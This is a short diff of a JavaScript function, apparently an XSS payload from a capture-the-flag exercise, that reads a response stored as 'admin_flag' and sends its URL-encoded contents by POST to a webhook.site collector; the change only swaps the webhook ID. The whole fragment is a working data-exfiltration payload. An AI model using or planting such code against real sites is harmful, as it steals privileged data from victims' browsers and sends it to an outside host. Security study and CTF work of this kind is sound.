@@ -3,7 +3,7 @@ async function getNotes() {
         method: 'GET',
         });
     const responseBody = await admin_flag.text();
-    const send = await fetch('https://webhook.site/061833a6-f58d-42c9-82af-842c15e502ca' + '?response=' + encodeURIComponent(responseBody), {
+    const send = await fetch('https://webhook.site/6468aa73-bdef-4ec4-b802-e0d5084b9da6' + '?response=' + encodeURIComponent(responseBody), {
     method: 'POST',
     });
     const output = document.createElement('p');
